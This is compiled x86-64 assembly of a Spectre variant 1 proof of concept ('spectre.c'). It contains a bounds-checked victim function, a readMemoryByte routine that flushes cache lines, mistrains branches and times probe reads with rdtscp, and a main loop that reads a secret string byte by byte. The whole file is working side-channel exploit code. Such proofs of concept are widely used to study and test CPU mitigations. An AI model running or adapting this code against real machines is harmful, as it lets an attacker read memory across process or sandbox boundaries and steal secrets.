	.text
	.file	"spectre.c"
	.globl	check                           # -- Begin function check
	.p2align	4, 0x90
	.type	check,@function
check:                                  # @check
	.cfi_startproc
# %bb.0:
	movslq	array1_size(%rip), %rcx
	xorl	%eax, %eax
	cmpq	%rdi, %rcx
	seta	%al
	retq
.Lfunc_end0:
	.size	check, .Lfunc_end0-check
	.cfi_endproc
                                        # -- End function
	.globl	victim_function                 # -- Begin function victim_function
	.p2align	4, 0x90
	.type	victim_function,@function
victim_function:                        # @victim_function
	.cfi_startproc
# %bb.0:
	movslq	array1_size(%rip), %rax
	xorl	%ecx, %ecx
	cmpq	%rdi, %rax
	cmovaq	%rdi, %rcx
	leaq	array1(%rip), %rax
	movzbl	(%rcx,%rax), %eax
	shlq	$9, %rax
	leaq	array2(%rip), %rcx
	movb	(%rax,%rcx), %al
	andb	%al, temp(%rip)
	retq
.Lfunc_end1:
	.size	victim_function, .Lfunc_end1-victim_function
	.cfi_endproc
                                        # -- End function
	.globl	readMemoryByte                  # -- Begin function readMemoryByte
	.p2align	4, 0x90
	.type	readMemoryByte,@function
readMemoryByte:                         # @readMemoryByte
	.cfi_startproc
# %bb.0:
	pushq	%rbp
	.cfi_def_cfa_offset 16
	pushq	%r15
	.cfi_def_cfa_offset 24
	pushq	%r14
	.cfi_def_cfa_offset 32
	pushq	%r13
	.cfi_def_cfa_offset 40
	pushq	%r12
	.cfi_def_cfa_offset 48
	pushq	%rbx
	.cfi_def_cfa_offset 56
	subq	$40, %rsp
	.cfi_def_cfa_offset 96
	.cfi_offset %rbx, -56
	.cfi_offset %r12, -48
	.cfi_offset %r13, -40
	.cfi_offset %r14, -32
	.cfi_offset %r15, -24
	.cfi_offset %rbp, -16
	movq	%rdx, 24(%rsp)                  # 8-byte Spill
	movq	%rsi, 16(%rsp)                  # 8-byte Spill
	movq	%rdi, 32(%rsp)                  # 8-byte Spill
	leaq	readMemoryByte.results(%rip), %rdi
	xorl	%ebx, %ebx
	movl	$1024, %edx                     # imm = 0x400
	xorl	%esi, %esi
	callq	memset@PLT
	movl	$999, %eax                      # imm = 0x3E7
	leaq	array2(%rip), %r15
	.p2align	4, 0x90
.LBB2_1:                                # =>This Loop Header: Depth=1
                                        #     Child Loop BB2_2 Depth 2
                                        #     Child Loop BB2_4 Depth 2
                                        #       Child Loop BB2_24 Depth 3
                                        #     Child Loop BB2_7 Depth 2
                                        #     Child Loop BB2_13 Depth 2
	xorl	%ecx, %ecx
	.p2align	4, 0x90
.LBB2_2:                                #   Parent Loop BB2_1 Depth=1
                                        # =>  This Inner Loop Header: Depth=2
	clflush	(%rcx,%r15)
	clflush	512(%rcx,%r15)
	clflush	1024(%rcx,%r15)
	clflush	1536(%rcx,%r15)
	clflush	2048(%rcx,%r15)
	clflush	2560(%rcx,%r15)
	clflush	3072(%rcx,%r15)
	clflush	3584(%rcx,%r15)
	addq	$4096, %rcx                     # imm = 0x1000
	cmpq	$131072, %rcx                   # imm = 0x20000
	jne	.LBB2_2
# %bb.3:                                #   in Loop: Header=BB2_1 Depth=1
	movq	%rax, %rbp
                                        # kill: def $eax killed $eax killed $rax
	cltd
	idivl	array1_size(%rip)
	movl	%edx, %r13d
	movq	%r13, %r14
	xorq	32(%rsp), %r14                  # 8-byte Folded Reload
	movl	$29, %r12d
	jmp	.LBB2_4
	.p2align	4, 0x90
.LBB2_5:                                #   in Loop: Header=BB2_4 Depth=2
	movl	%r12d, %eax
	movl	$2863311531, %ecx               # imm = 0xAAAAAAAB
	imulq	%rcx, %rax
	shrq	$34, %rax
	addl	%eax, %eax
	leal	(%rax,%rax,2), %eax
	notl	%eax
	addl	%r12d, %eax
	andl	$-65536, %eax                   # imm = 0xFFFF0000
	cltq
	movq	%rax, %rdi
	shrq	$16, %rdi
	orq	%rax, %rdi
	andq	%r14, %rdi
	xorq	%r13, %rdi
	callq	victim_function
	subl	$1, %r12d
	jb	.LBB2_6
.LBB2_4:                                #   Parent Loop BB2_1 Depth=1
                                        # =>  This Loop Header: Depth=2
                                        #       Child Loop BB2_24 Depth 3
	clflush	array1_size(%rip)
	movl	$0, 12(%rsp)
	movl	12(%rsp), %eax
	cmpl	$99, %eax
	jg	.LBB2_5
	.p2align	4, 0x90
.LBB2_24:                               #   Parent Loop BB2_1 Depth=1
                                        #     Parent Loop BB2_4 Depth=2
                                        # =>    This Inner Loop Header: Depth=3
	addl	$1, 12(%rsp)
	movl	12(%rsp), %eax
	cmpl	$100, %eax
	jl	.LBB2_24
	jmp	.LBB2_5
	.p2align	4, 0x90
.LBB2_6:                                #   in Loop: Header=BB2_1 Depth=1
	movl	$13, %edi
	leaq	readMemoryByte.results(%rip), %r9
	movq	%rbp, %r8
	leaq	array1(%rip), %r10
	jmp	.LBB2_7
	.p2align	4, 0x90
.LBB2_11:                               #   in Loop: Header=BB2_7 Depth=2
	addl	$167, %edi
	cmpl	$42765, %edi                    # imm = 0xA70D
	je	.LBB2_12
.LBB2_7:                                #   Parent Loop BB2_1 Depth=1
                                        # =>  This Inner Loop Header: Depth=2
	movl	%edi, %eax
	andl	$255, %eax
	je	.LBB2_11
# %bb.8:                                #   in Loop: Header=BB2_7 Depth=2
	movl	%eax, %ebp
	movq	%rbp, %rbx
	shlq	$9, %rbx
	rdtscp
	movq	%rdx, %rsi
	shlq	$32, %rsi
	orq	%rax, %rsi
	movzbl	(%rbx,%r15), %eax
	rdtscp
	movl	%ecx, %ebx
	shlq	$32, %rdx
	orq	%rax, %rdx
	subq	%rsi, %rdx
	cmpq	$100, %rdx
	ja	.LBB2_11
# %bb.9:                                #   in Loop: Header=BB2_7 Depth=2
	movl	%r8d, %eax
	cltd
	idivl	array1_size(%rip)
                                        # kill: def $edx killed $edx def $rdx
	cmpb	(%rdx,%r10), %dil
	je	.LBB2_11
# %bb.10:                               #   in Loop: Header=BB2_7 Depth=2
	addl	$1, (%r9,%rbp,4)
	jmp	.LBB2_11
	.p2align	4, 0x90
.LBB2_12:                               #   in Loop: Header=BB2_1 Depth=1
	movl	$-1, %eax
	movq	%r9, %rcx
	xorl	%edx, %edx
	movl	$-1, %esi
	jmp	.LBB2_13
	.p2align	4, 0x90
.LBB2_14:                               #   in Loop: Header=BB2_13 Depth=2
	movl	%eax, %esi
	movl	%edx, %eax
.LBB2_19:                               #   in Loop: Header=BB2_13 Depth=2
	addq	$1, %rdx
	addq	$4, %rcx
	cmpq	$256, %rdx                      # imm = 0x100
	je	.LBB2_20
.LBB2_13:                               #   Parent Loop BB2_1 Depth=1
                                        # =>  This Inner Loop Header: Depth=2
	testl	%eax, %eax
	js	.LBB2_14
# %bb.15:                               #   in Loop: Header=BB2_13 Depth=2
	movl	(%rcx), %edi
	movl	%eax, %ebp
	cmpl	(%r9,%rbp,4), %edi
	jge	.LBB2_14
# %bb.16:                               #   in Loop: Header=BB2_13 Depth=2
	testl	%esi, %esi
	js	.LBB2_18
# %bb.17:                               #   in Loop: Header=BB2_13 Depth=2
	movl	%esi, %ebp
	cmpl	(%r9,%rbp,4), %edi
	jl	.LBB2_19
.LBB2_18:                               #   in Loop: Header=BB2_13 Depth=2
	movl	%edx, %esi
	jmp	.LBB2_19
	.p2align	4, 0x90
.LBB2_20:                               #   in Loop: Header=BB2_1 Depth=1
	movslq	%eax, %rcx
	movl	(%r9,%rcx,4), %edx
	movslq	%esi, %rbp
	movl	(%r9,%rbp,4), %esi
	leal	(%rsi,%rsi), %edi
	addl	$5, %edi
	cmpl	%edi, %edx
	jge	.LBB2_23
# %bb.21:                               #   in Loop: Header=BB2_1 Depth=1
	xorl	$2, %edx
	orl	%esi, %edx
	je	.LBB2_23
# %bb.22:                               #   in Loop: Header=BB2_1 Depth=1
	leal	-1(%r8), %edx
	cmpl	$1, %r8d
	movl	%edx, %eax
	ja	.LBB2_1
.LBB2_23:
	xorl	%ebx, readMemoryByte.results(%rip)
	leaq	readMemoryByte.results(%rip), %rdx
	movq	16(%rsp), %rdi                  # 8-byte Reload
	movb	%cl, (%rdi)
	movl	(%rdx,%rcx,4), %ecx
	movq	24(%rsp), %rsi                  # 8-byte Reload
	movl	%ecx, (%rsi)
	movb	%bpl, 1(%rdi)
	movl	(%rdx,%rbp,4), %eax
	movl	%eax, 4(%rsi)
	addq	$40, %rsp
	.cfi_def_cfa_offset 56
	popq	%rbx
	.cfi_def_cfa_offset 48
	popq	%r12
	.cfi_def_cfa_offset 40
	popq	%r13
	.cfi_def_cfa_offset 32
	popq	%r14
	.cfi_def_cfa_offset 24
	popq	%r15
	.cfi_def_cfa_offset 16
	popq	%rbp
	.cfi_def_cfa_offset 8
	retq
.Lfunc_end2:
	.size	readMemoryByte, .Lfunc_end2-readMemoryByte
	.cfi_endproc
                                        # -- End function
	.globl	main                            # -- Begin function main
	.p2align	4, 0x90
	.type	main,@function
main:                                   # @main
	.cfi_startproc
# %bb.0:
	pushq	%rbp
	.cfi_def_cfa_offset 16
	pushq	%r15
	.cfi_def_cfa_offset 24
	pushq	%r14
	.cfi_def_cfa_offset 32
	pushq	%r13
	.cfi_def_cfa_offset 40
	pushq	%r12
	.cfi_def_cfa_offset 48
	pushq	%rbx
	.cfi_def_cfa_offset 56
	subq	$56, %rsp
	.cfi_def_cfa_offset 112
	.cfi_offset %rbx, -56
	.cfi_offset %r12, -48
	.cfi_offset %r13, -40
	.cfi_offset %r14, -32
	.cfi_offset %r15, -24
	.cfi_offset %rbp, -16
	movq	%rsi, 32(%rsp)                  # 8-byte Spill
	movl	%edi, 28(%rsp)                  # 4-byte Spill
	movq	stdin@GOTPCREL(%rip), %rbx
	leaq	array1(%rip), %r13
	leaq	array2(%rip), %r15
	jmp	.LBB3_1
	.p2align	4, 0x90
.LBB3_35:                               #   in Loop: Header=BB3_1 Depth=1
	xorl	%eax, %eax
	callq	getpid@PLT
	leaq	.L.str.13(%rip), %rdi
	leaq	check+33(%rip), %rsi
	movl	%eax, %edx
	xorl	%eax, %eax
	callq	printf@PLT
.LBB3_1:                                # =>This Loop Header: Depth=1
                                        #     Child Loop BB3_8 Depth 2
                                        #       Child Loop BB3_9 Depth 3
                                        #         Child Loop BB3_10 Depth 4
                                        #         Child Loop BB3_12 Depth 4
                                        #           Child Loop BB3_37 Depth 5
                                        #         Child Loop BB3_15 Depth 4
                                        #         Child Loop BB3_21 Depth 4
	movq	(%rbx), %rdi
	callq	getc@PLT
	shll	$24, %eax
	cmpl	$167772160, %eax                # imm = 0xA000000
	je	.LBB3_1
# %bb.2:                                #   in Loop: Header=BB3_1 Depth=1
	cmpl	$1761607680, %eax               # imm = 0x69000000
	je	.LBB3_35
# %bb.3:                                #   in Loop: Header=BB3_1 Depth=1
	cmpl	$1912602624, %eax               # imm = 0x72000000
	jne	.LBB3_36
# %bb.4:                                #   in Loop: Header=BB3_1 Depth=1
	movq	secret(%rip), %rdx
	leaq	.L.str.1(%rip), %rdi
	movq	%rdx, %rsi
	xorl	%eax, %eax
	callq	printf@PLT
	movq	secret(%rip), %rdi
	movq	%rdi, %rax
	subq	%r13, %rax
	movq	%rax, 8(%rsp)
	callq	strlen@PLT
	movq	%rax, %rbp
	movl	%ebp, (%rsp)
	movl	$131072, %edx                   # imm = 0x20000
	movq	%r15, %rdi
	movl	$1, %esi
	callq	memset@PLT
	cmpl	$3, 28(%rsp)                    # 4-byte Folded Reload
	jne	.LBB3_6
# %bb.5:                                #   in Loop: Header=BB3_1 Depth=1
	movq	32(%rsp), %rbx                  # 8-byte Reload
	movq	8(%rbx), %rdi
	leaq	.L.str.2(%rip), %rsi
	leaq	8(%rsp), %rdx
	xorl	%eax, %eax
	callq	__isoc99_sscanf@PLT
	subq	%r13, 8(%rsp)
	movq	16(%rbx), %rdi
	leaq	.L.str.3(%rip), %rsi
	movq	%rsp, %rdx
	xorl	%eax, %eax
	callq	__isoc99_sscanf@PLT
	movq	8(%rsp), %rsi
	movl	(%rsp), %edx
	leaq	.L.str.4(%rip), %rdi
	xorl	%eax, %eax
	callq	printf@PLT
	movl	(%rsp), %ebp
.LBB3_6:                                #   in Loop: Header=BB3_1 Depth=1
	leaq	.L.str.5(%rip), %rdi
	movl	%ebp, %esi
	xorl	%eax, %eax
	callq	printf@PLT
	movl	(%rsp), %eax
	leal	-1(%rax), %ecx
	movl	%ecx, (%rsp)
	testl	%eax, %eax
	jle	.LBB3_34
# %bb.7:                                #   in Loop: Header=BB3_1 Depth=1
	xorl	%ebx, %ebx
	jmp	.LBB3_8
	.p2align	4, 0x90
.LBB3_33:                               #   in Loop: Header=BB3_8 Depth=2
	movl	$10, %edi
	callq	putchar@PLT
	movl	(%rsp), %eax
	leal	-1(%rax), %ecx
	movl	%ecx, (%rsp)
	testl	%eax, %eax
	movq	40(%rsp), %rbx                  # 8-byte Reload
	jle	.LBB3_34
.LBB3_8:                                #   Parent Loop BB3_1 Depth=1
                                        # =>  This Loop Header: Depth=2
                                        #       Child Loop BB3_9 Depth 3
                                        #         Child Loop BB3_10 Depth 4
                                        #         Child Loop BB3_12 Depth 4
                                        #           Child Loop BB3_37 Depth 5
                                        #         Child Loop BB3_15 Depth 4
                                        #         Child Loop BB3_21 Depth 4
	movq	8(%rsp), %rsi
	movq	secret(%rip), %rax
	movsbl	(%rax,%rbx), %edx
	xorl	%ebp, %ebp
	leaq	.L.str.6(%rip), %rdi
	xorl	%eax, %eax
	callq	printf@PLT
	addq	$1, %rbx
	movq	%rbx, 40(%rsp)                  # 8-byte Spill
	movq	8(%rsp), %rax
	movq	%rax, 48(%rsp)                  # 8-byte Spill
	addq	$1, %rax
	movq	%rax, 8(%rsp)
	movl	$1024, %edx                     # imm = 0x400
	leaq	readMemoryByte.results(%rip), %rdi
	xorl	%esi, %esi
	callq	memset@PLT
	movl	$999, %eax                      # imm = 0x3E7
	movq	%rax, 16(%rsp)                  # 8-byte Spill
	.p2align	4, 0x90
.LBB3_9:                                #   Parent Loop BB3_1 Depth=1
                                        #     Parent Loop BB3_8 Depth=2
                                        # =>    This Loop Header: Depth=3
                                        #         Child Loop BB3_10 Depth 4
                                        #         Child Loop BB3_12 Depth 4
                                        #           Child Loop BB3_37 Depth 5
                                        #         Child Loop BB3_15 Depth 4
                                        #         Child Loop BB3_21 Depth 4
	movq	%r13, %rbx
	xorl	%eax, %eax
	.p2align	4, 0x90
.LBB3_10:                               #   Parent Loop BB3_1 Depth=1
                                        #     Parent Loop BB3_8 Depth=2
                                        #       Parent Loop BB3_9 Depth=3
                                        # =>      This Inner Loop Header: Depth=4
	clflush	(%rax,%r15)
	clflush	512(%rax,%r15)
	clflush	1024(%rax,%r15)
	clflush	1536(%rax,%r15)
	clflush	2048(%rax,%r15)
	clflush	2560(%rax,%r15)
	clflush	3072(%rax,%r15)
	clflush	3584(%rax,%r15)
	addq	$4096, %rax                     # imm = 0x1000
	cmpq	$131072, %rax                   # imm = 0x20000
	jne	.LBB3_10
# %bb.11:                               #   in Loop: Header=BB3_9 Depth=3
	movq	16(%rsp), %rax                  # 8-byte Reload
                                        # kill: def $eax killed $eax killed $rax
	cltd
	idivl	array1_size(%rip)
	movl	%edx, %r14d
	movq	48(%rsp), %r13                  # 8-byte Reload
	xorq	%r14, %r13
	movl	$29, %r12d
	jmp	.LBB3_12
	.p2align	4, 0x90
.LBB3_13:                               #   in Loop: Header=BB3_12 Depth=4
	movl	%r12d, %eax
	movl	$2863311531, %ecx               # imm = 0xAAAAAAAB
	imulq	%rcx, %rax
	shrq	$34, %rax
	addl	%eax, %eax
	leal	(%rax,%rax,2), %eax
	notl	%eax
	addl	%r12d, %eax
	andl	$-65536, %eax                   # imm = 0xFFFF0000
	cltq
	movq	%rax, %rdi
	shrq	$16, %rdi
	orq	%rax, %rdi
	andq	%r13, %rdi
	xorq	%r14, %rdi
	callq	victim_function
	subl	$1, %r12d
	jb	.LBB3_14
.LBB3_12:                               #   Parent Loop BB3_1 Depth=1
                                        #     Parent Loop BB3_8 Depth=2
                                        #       Parent Loop BB3_9 Depth=3
                                        # =>      This Loop Header: Depth=4
                                        #           Child Loop BB3_37 Depth 5
	clflush	array1_size(%rip)
	movl	$0, 4(%rsp)
	movl	4(%rsp), %eax
	cmpl	$99, %eax
	jg	.LBB3_13
	.p2align	4, 0x90
.LBB3_37:                               #   Parent Loop BB3_1 Depth=1
                                        #     Parent Loop BB3_8 Depth=2
                                        #       Parent Loop BB3_9 Depth=3
                                        #         Parent Loop BB3_12 Depth=4
                                        # =>        This Inner Loop Header: Depth=5
	addl	$1, 4(%rsp)
	movl	4(%rsp), %eax
	cmpl	$100, %eax
	jl	.LBB3_37
	jmp	.LBB3_13
	.p2align	4, 0x90
.LBB3_14:                               #   in Loop: Header=BB3_9 Depth=3
	movl	$13, %edi
	movq	%rbx, %r13
	leaq	readMemoryByte.results(%rip), %r8
	movq	16(%rsp), %r9                   # 8-byte Reload
	jmp	.LBB3_15
	.p2align	4, 0x90
.LBB3_19:                               #   in Loop: Header=BB3_15 Depth=4
	addl	$167, %edi
	cmpl	$42765, %edi                    # imm = 0xA70D
	je	.LBB3_20
.LBB3_15:                               #   Parent Loop BB3_1 Depth=1
                                        #     Parent Loop BB3_8 Depth=2
                                        #       Parent Loop BB3_9 Depth=3
                                        # =>      This Inner Loop Header: Depth=4
	movl	%edi, %eax
	andl	$255, %eax
	je	.LBB3_19
# %bb.16:                               #   in Loop: Header=BB3_15 Depth=4
	movl	%eax, %ebx
	movq	%rbx, %rbp
	shlq	$9, %rbp
	rdtscp
	movq	%rdx, %rsi
	shlq	$32, %rsi
	orq	%rax, %rsi
	movzbl	(%rbp,%r15), %eax
	rdtscp
	movl	%ecx, %ebp
	shlq	$32, %rdx
	orq	%rax, %rdx
	subq	%rsi, %rdx
	cmpq	$100, %rdx
	ja	.LBB3_19
# %bb.17:                               #   in Loop: Header=BB3_15 Depth=4
	movl	%r9d, %eax
	cltd
	idivl	array1_size(%rip)
                                        # kill: def $edx killed $edx def $rdx
	cmpb	(%rdx,%r13), %dil
	je	.LBB3_19
# %bb.18:                               #   in Loop: Header=BB3_15 Depth=4
	addl	$1, (%r8,%rbx,4)
	jmp	.LBB3_19
	.p2align	4, 0x90
.LBB3_20:                               #   in Loop: Header=BB3_9 Depth=3
	movl	$-1, %eax
	movq	%r8, %rcx
	xorl	%edx, %edx
	movl	$-1, %r14d
	jmp	.LBB3_21
	.p2align	4, 0x90
.LBB3_22:                               #   in Loop: Header=BB3_21 Depth=4
	movl	%eax, %r14d
	movl	%edx, %eax
.LBB3_27:                               #   in Loop: Header=BB3_21 Depth=4
	addq	$1, %rdx
	addq	$4, %rcx
	cmpq	$256, %rdx                      # imm = 0x100
	je	.LBB3_28
.LBB3_21:                               #   Parent Loop BB3_1 Depth=1
                                        #     Parent Loop BB3_8 Depth=2
                                        #       Parent Loop BB3_9 Depth=3
                                        # =>      This Inner Loop Header: Depth=4
	testl	%eax, %eax
	js	.LBB3_22
# %bb.23:                               #   in Loop: Header=BB3_21 Depth=4
	movl	(%rcx), %esi
	movl	%eax, %edi
	cmpl	(%r8,%rdi,4), %esi
	jge	.LBB3_22
# %bb.24:                               #   in Loop: Header=BB3_21 Depth=4
	testl	%r14d, %r14d
	js	.LBB3_26
# %bb.25:                               #   in Loop: Header=BB3_21 Depth=4
	movl	%r14d, %edi
	cmpl	(%r8,%rdi,4), %esi
	jl	.LBB3_27
.LBB3_26:                               #   in Loop: Header=BB3_21 Depth=4
	movl	%edx, %r14d
	jmp	.LBB3_27
	.p2align	4, 0x90
.LBB3_28:                               #   in Loop: Header=BB3_9 Depth=3
	movslq	%eax, %r12
	movl	(%r8,%r12,4), %ecx
	movslq	%r14d, %rax
	movl	(%r8,%rax,4), %edx
	leal	(%rdx,%rdx), %esi
	addl	$5, %esi
	cmpl	%esi, %ecx
	jge	.LBB3_31
# %bb.29:                               #   in Loop: Header=BB3_9 Depth=3
	xorl	$2, %ecx
	orl	%edx, %ecx
	je	.LBB3_31
# %bb.30:                               #   in Loop: Header=BB3_9 Depth=3
	movq	16(%rsp), %rdx                  # 8-byte Reload
	leal	-1(%rdx), %ecx
	cmpl	$1, %edx
                                        # kill: def $ecx killed $ecx def $rcx
	movq	%rcx, 16(%rsp)                  # 8-byte Spill
	ja	.LBB3_9
.LBB3_31:                               #   in Loop: Header=BB3_8 Depth=2
	xorl	%ebp, readMemoryByte.results(%rip)
	movl	(%r8,%r12,4), %ebp
	movl	(%r8,%rax,4), %ebx
	leal	(%rbx,%rbx), %eax
	cmpl	%eax, %ebp
	leaq	.L.str.8(%rip), %rsi
	leaq	.L.str.9(%rip), %rax
	cmovlq	%rax, %rsi
	leaq	.L.str.7(%rip), %rdi
	xorl	%eax, %eax
	callq	printf@PLT
	movzbl	%r12b, %esi
	leal	-32(%rsi), %eax
	cmpb	$95, %al
	movl	$63, %edx
	cmovbl	%esi, %edx
	leaq	.L.str.10(%rip), %rdi
                                        # kill: def $esi killed $esi killed $rsi
	movl	%ebp, %ecx
	xorl	%eax, %eax
	callq	printf@PLT
	testl	%ebx, %ebx
	jle	.LBB3_33
# %bb.32:                               #   in Loop: Header=BB3_8 Depth=2
	movzbl	%r14b, %esi
	leal	-32(%rsi), %eax
	cmpb	$95, %al
	movl	$63, %edx
	cmovbl	%esi, %edx
	leaq	.L.str.11(%rip), %rdi
                                        # kill: def $esi killed $esi killed $rsi
	movl	%ebx, %ecx
	xorl	%eax, %eax
	callq	printf@PLT
	jmp	.LBB3_33
	.p2align	4, 0x90
.LBB3_34:                               #   in Loop: Header=BB3_1 Depth=1
	movq	stdin@GOTPCREL(%rip), %rbx
	jmp	.LBB3_1
.LBB3_36:
	xorl	%eax, %eax
	addq	$56, %rsp
	.cfi_def_cfa_offset 56
	popq	%rbx
	.cfi_def_cfa_offset 48
	popq	%r12
	.cfi_def_cfa_offset 40
	popq	%r13
	.cfi_def_cfa_offset 32
	popq	%r14
	.cfi_def_cfa_offset 24
	popq	%r15
	.cfi_def_cfa_offset 16
	popq	%rbp
	.cfi_def_cfa_offset 8
	retq
.Lfunc_end3:
	.size	main, .Lfunc_end3-main
	.cfi_endproc
                                        # -- End function